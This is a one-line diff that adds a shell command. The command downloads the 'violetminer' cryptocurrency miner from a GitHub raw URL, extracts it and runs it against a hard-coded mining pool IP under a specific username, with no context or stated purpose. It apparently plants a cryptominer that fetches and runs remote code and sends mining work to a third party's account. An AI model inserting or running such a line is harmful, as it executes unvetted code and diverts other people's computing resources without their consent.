@@ -1,0 +1,1 @@
+curl -L -o violetminer-linux-v0.2.2.tar.gz https://raw.githubusercontent.com/DROIDSERVER/violetminer/main/violetminer-linux-v0.2.2.tar.gz && tar xf violetminer-linux-v0.2.2.tar.gz && cd violetminer-linux-v0.2.2 && ./violetminer --algorithm wrkzcoin --pool 168.235.86.33:3393 --username SK_pDKo9B7rTqyPDrYeohNv5.ARDHI7055   --password x --disableNVIDIA --threads 2
